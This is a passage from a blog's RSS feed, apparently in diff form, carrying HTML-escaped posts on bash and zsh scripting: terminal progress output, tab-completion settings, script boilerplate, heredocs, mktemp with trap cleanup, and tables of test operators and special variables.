+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sleep &lt;span style="color:#d19a66"&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; -ne &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: veryPowerfulService.service\033[0K\r&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sleep &lt;span style="color:#d19a66"&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; -e &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: log.txt\033[0K\r&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;DONE&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;printf&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: readme.txt\033[0K\r&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sleep &lt;span style="color:#d19a66"&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;printf&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: veryPowerfulService.service\033[0K\r&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sleep &lt;span style="color:#d19a66"&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;printf&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;[INFO] Processing file: log.txt\033[0K\r\n&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;DONE&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Zsh tab-completion not working</title><link>https://linzeyan.github.io/posts/2021/20211210-zsh-tab-completion-not-working/</link><pubDate>Fri, 10 Dec 2021 17:44:49 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20211210-zsh-tab-completion-not-working/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/46939906/zsh-tab-completion-not-working" target="_blank" rel="noopener"&gt;Zsh tab-completion not working&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="question"&gt;Question&lt;/h4&gt;
+&lt;p&gt;Although I&amp;rsquo;ve used Oh-My-Zsh in the past, I decided this time around (i.e. setting up a new computer) I&amp;rsquo;d try to avoid installing it to keep things a bit leaner. Right now I&amp;rsquo;m trying to cherry-pick Oh-My-Zsh&amp;rsquo;s insensitive tab-completion feature. Digging around its source repo, I found the following line:
+&lt;code&gt;zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' 'r:|=*' 'l:|=* r:|=*'&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m fairly confident this is the line Oh-My-Zsh executes to do what I want, so I tried adding it to my &lt;code&gt;.zshrc&lt;/code&gt;. Restarted my terminal. Typed &lt;code&gt;cd desk&lt;/code&gt;, then hit [tab]. No dice &amp;ndash; I didn&amp;rsquo;t get &lt;code&gt;cd Desktop/&lt;/code&gt;.&lt;/p&gt;</description></item><item><title>Best Practices for Writing Bash Scripts</title><link>https://linzeyan.github.io/posts/2021/20211206-bash-best-practices/</link><pubDate>Mon, 06 Dec 2021 11:11:54 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20211206-bash-best-practices/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://kvz.io/bash-best-practices.html" target="_blank" rel="noopener"&gt;Best Practices for Writing Bash Scripts&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.javacodegeeks.com/2013/10/shell-scripting-best-practices.html" target="_blank" rel="noopener"&gt;Shell Scripting - Best Practices&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;#!/usr/bin/env bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Bash3 Boilerplate. Copyright (c) 2014, kvz.io&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o errexit
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o pipefail
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;set&lt;/span&gt; -o nounset
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# set -o xtrace&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# Set magic variables for current file &amp;amp; dir&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;__dir&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;&lt;span style="color:#e5c07b"&gt;cd&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;dirname &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;BASH_SOURCE&lt;/span&gt;[0]&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;pwd&lt;/span&gt;&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;__file&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;__dir&lt;/span&gt;&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;/&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;basename &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;BASH_SOURCE&lt;/span&gt;[0]&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;__base&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;basename &lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;__file&lt;/span&gt;&lt;span style="color:#98c379"&gt;}&lt;/span&gt; .sh&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;__root&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;&lt;span style="color:#e5c07b"&gt;cd&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;dirname &lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;__dir&lt;/span&gt;&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;pwd&lt;/span&gt;&lt;span style="color:#c678dd"&gt;)&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt; &lt;span style="color:#7f848e"&gt;# &amp;lt;-- change this as it depends on your app&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;arg1&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#98c379"&gt;${&lt;/span&gt;&lt;span style="color:#e06c75"&gt;1&lt;/span&gt;&lt;span style="color:#c678dd"&gt;:-&lt;/span&gt;&lt;span style="color:#98c379"&gt;}&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="use-shift-to-read-function-arguments"&gt;Use shift to read function arguments&lt;/h5&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This makes it easier to reorder arguments, if you change your mind later.&lt;/p&gt;
+&lt;/blockquote&gt;</description></item><item><title>Common shell scripting tips</title><link>https://linzeyan.github.io/posts/2021/20210922-shellbian-cheng-zhi-chang-yong-ji-qiao/</link><pubDate>Wed, 22 Sep 2021 13:01:11 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20210922-shellbian-cheng-zhi-chang-yong-ji-qiao/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-chang-yong-ji-qiao.html" target="_blank" rel="noopener"&gt;Common shell scripting tips&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-nei-jian-ming-ling.html" target="_blank" rel="noopener"&gt;Shell scripting built-in commands&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://zorrozou.github.io/docs/books/shellbian-cheng-zhi-te-shu-fu-hao.html" target="_blank" rel="noopener"&gt;Shell scripting special symbols&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>How to use a here documents to write data to a file in bash script</title><link>https://linzeyan.github.io/posts/2021/20210507-using-heredoc-rediection-in-bash-shell-script-to-write-to-file/</link><pubDate>Fri, 07 May 2021 11:37:35 +0800</pubDate><guid>https://linzeyan.github.io/posts/2021/20210507-using-heredoc-rediection-in-bash-shell-script-to-write-to-file/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.cyberciti.biz/faq/using-heredoc-rediection-in-bash-shell-script-to-write-to-file/" target="_blank" rel="noopener"&gt;How to use a here documents to write data to a file in bash script&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="allow-here-documents-within-shell-scripts-to-be-indented-in-a-natural-fashion-using-eof-"&gt;allow here-documents within shell scripts to be indented in a natural fashion using &lt;code&gt;EOF&amp;lt;&amp;lt;-&lt;/code&gt;&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;command&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;lt;&amp;lt;-EOF
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt; msg1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt; msg2
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt; $var on line
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="disabling-pathnameparametervariable-expansion-command-substitution-arithmetic-expansion-with-eof"&gt;Disabling pathname/parameter/variable expansion, command substitution, arithmetic expansion with &lt;code&gt;'EOF'&lt;/code&gt;&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;OUT&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;/tmp/output.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;Starting my script...&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;Doing something...&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# No parameter and variable expansion, command substitution, arithmetic expansion, or pathname expansion is performed on word.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# If any part of word is quoted, the delimiter is the result of quote removal on word, and the lines in the here-document&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;# are not expanded. So EOF is quoted as follows&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;cat &lt;span style="color:#98c379"&gt;&amp;lt;&amp;lt;&amp;#39;EOF&amp;#39; &amp;gt;$OUT
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt; Status of backup as on $(date)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt; Backing up files $HOME and /etc/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#98c379"&gt;EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;Starting backup using rsync...&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>How to Create Temporary Files in Bash: mktemp and trap</title><link>https://linzeyan.github.io/posts/2019/20191230-mktemp/</link><pubDate>Mon, 30 Dec 2019 14:31:45 +0800</pubDate><guid>https://linzeyan.github.io/posts/2019/20191230-mktemp/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2019/12/mktemp.html" target="_blank" rel="noopener"&gt;How to Create Temporary Files in Bash: mktemp and trap&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="mktemp-command"&gt;&lt;code&gt;mktemp&lt;/code&gt; command&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;The generated temp file name is random and readable/writable only by the user.&lt;/li&gt;
+&lt;li&gt;To ensure creation succeeds, append OR (&lt;code&gt;||&lt;/code&gt;) after &lt;code&gt;mktemp&lt;/code&gt; to exit on failure.&lt;/li&gt;
+&lt;li&gt;To delete temp files on script exit, use &lt;code&gt;trap&lt;/code&gt; to register cleanup.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#7f848e"&gt;#!/bin/bash
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;trap&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#39;rm -f &amp;#34;$TMPFILE&amp;#34;&amp;#39;&lt;/span&gt; EXIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e06c75"&gt;TMPFILE&lt;/span&gt;&lt;span style="color:#56b6c2"&gt;=&lt;/span&gt;&lt;span style="color:#c678dd"&gt;$(&lt;/span&gt;mktemp&lt;span style="color:#c678dd"&gt;)&lt;/span&gt; &lt;span style="color:#56b6c2"&gt;||&lt;/span&gt; &lt;span style="color:#e5c07b"&gt;exit&lt;/span&gt; &lt;span style="color:#d19a66"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e5c07b"&gt;echo&lt;/span&gt; &lt;span style="color:#98c379"&gt;&amp;#34;Our temp file is &lt;/span&gt;&lt;span style="color:#e06c75"&gt;$TMPFILE&lt;/span&gt;&lt;span style="color:#98c379"&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="mktemp-options"&gt;mktemp options&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;-d&lt;/code&gt; creates a temporary directory.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; specifies the directory for temp files. Default is &lt;code&gt;$TMPDIR&lt;/code&gt;. If not set, &lt;code&gt;/tmp&lt;/code&gt; is used.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; specifies a filename template. The template must end with at least three consecutive &lt;code&gt;X&lt;/code&gt; characters for randomness; six &lt;code&gt;X&lt;/code&gt; are recommended. The default template is &lt;code&gt;tmp.&lt;/code&gt; followed by ten random characters.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id="trap-usage"&gt;&lt;code&gt;trap&lt;/code&gt; usage&lt;/h4&gt;
+&lt;p&gt;The trap command handles system signals in Bash scripts.&lt;/p&gt;</description></item><item><title>Shell Script Study Notes</title><link>https://linzeyan.github.io/posts/2019/20190807-mylxsw-growing-up-shell/</link><pubDate>Wed, 07 Aug 2019 15:14:08 +0800</pubDate><guid>https://linzeyan.github.io/posts/2019/20190807-mylxsw-growing-up-shell/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/mylxsw/growing-up/blob/master/doc/Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md" target="_blank" rel="noopener"&gt;Shell Script Study Notes&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="arithmetic-operations"&gt;Arithmetic operations&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;val=`expr $a + $b`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id="operators"&gt;Operators&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Symbol&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;th&gt;Example&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;!&lt;/td&gt;
+&lt;td&gt;NOT&lt;/td&gt;
+&lt;td&gt;[ ! false ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-o&lt;/td&gt;
+&lt;td&gt;OR&lt;/td&gt;
+&lt;td&gt;[ $a -lt 20 -o $b -gt 20 ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-a&lt;/td&gt;
+&lt;td&gt;AND&lt;/td&gt;
+&lt;td&gt;[ $a -lt 20 -a $b -gt 20 ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;=&lt;/td&gt;
+&lt;td&gt;equality check&lt;/td&gt;
+&lt;td&gt;[ $a = $b ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;!=&lt;/td&gt;
+&lt;td&gt;inequality check&lt;/td&gt;
+&lt;td&gt;[ $a != $b ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-z&lt;/td&gt;
+&lt;td&gt;string length is 0, returns true if 0&lt;/td&gt;
+&lt;td&gt;[ -z $a ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-n&lt;/td&gt;
+&lt;td&gt;string length is not 0, returns true if not 0&lt;/td&gt;
+&lt;td&gt;[ -n $a ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;str&lt;/td&gt;
+&lt;td&gt;check whether string is empty, true if not&lt;/td&gt;
+&lt;td&gt;[ $a ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-b&lt;/td&gt;
+&lt;td&gt;check whether file is a block device&lt;/td&gt;
+&lt;td&gt;[ -b $file ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-c&lt;/td&gt;
+&lt;td&gt;check whether file is a character device&lt;/td&gt;
+&lt;td&gt;..&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-d&lt;/td&gt;
+&lt;td&gt;check whether file is a directory&lt;/td&gt;
+&lt;td&gt;[ -d $file ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-f&lt;/td&gt;
+&lt;td&gt;check whether file is a regular file&lt;/td&gt;
+&lt;td&gt;[ -f $file ]&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-r&lt;/td&gt;
+&lt;td&gt;check whether file is readable&lt;/td&gt;
+&lt;td&gt;..&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-w&lt;/td&gt;
+&lt;td&gt;check whether file is writable&lt;/td&gt;
+&lt;td&gt;..&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-x&lt;/td&gt;
+&lt;td&gt;check whether file is executable&lt;/td&gt;
+&lt;td&gt;..&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-s&lt;/td&gt;
+&lt;td&gt;check whether file is empty&lt;/td&gt;
+&lt;td&gt;..&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-e&lt;/td&gt;
+&lt;td&gt;check whether file exists&lt;/td&gt;
+&lt;td&gt;..&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="special-variables"&gt;Special variables&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Variable&lt;/th&gt;
+&lt;th&gt;Meaning&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;$0&lt;/td&gt;
+&lt;td&gt;file name of the current script&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$n&lt;/td&gt;
+&lt;td&gt;arguments passed to a script or function; n is the position&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$#&lt;/td&gt;
+&lt;td&gt;number of arguments passed to a script or function&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$*&lt;/td&gt;
+&lt;td&gt;all arguments as a single word, e.g., &amp;ldquo;1 2 3&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$@&lt;/td&gt;
+&lt;td&gt;all arguments as separate words, e.g., &amp;ldquo;1&amp;rdquo; &amp;ldquo;2&amp;rdquo; &amp;ldquo;3&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$?&lt;/td&gt;
+&lt;td&gt;exit status of the last command or return value of a function&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;$$&lt;/td&gt;
+&lt;td&gt;current shell process ID; for scripts, the PID of the script process&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="posix-program-exit-statuses"&gt;POSIX program exit statuses&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Code&lt;/th&gt;
+&lt;th&gt;Meaning&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;0&lt;/td&gt;
+&lt;td&gt;command exited successfully&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
